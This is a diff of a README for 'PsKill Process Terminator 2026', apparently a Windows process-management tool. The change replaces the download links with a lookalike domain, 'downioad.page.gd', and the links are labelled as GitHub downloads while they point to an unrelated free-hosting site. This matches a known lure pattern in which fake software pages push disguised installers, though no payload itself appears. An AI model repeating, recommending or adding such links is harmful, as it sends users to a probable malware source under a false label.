@@ -2,7 +2,7 @@
 
 PsKill Process Terminator 2026 is a professional-grade Windows desktop application designed for precise and powerful control over running system processes. This tool provides system administrators and power users with an intuitive interface to view, analyze, and terminate processes, offering a robust alternative to standard system utilities. It is optimized for modern Windows 10 and Windows 11 environments, ensuring reliability and performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -50,4 +50,4 @@ A: The uninstaller is designed to remove all application files and registry keys
 
 For the latest version of PsKill Process Terminator 2026, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
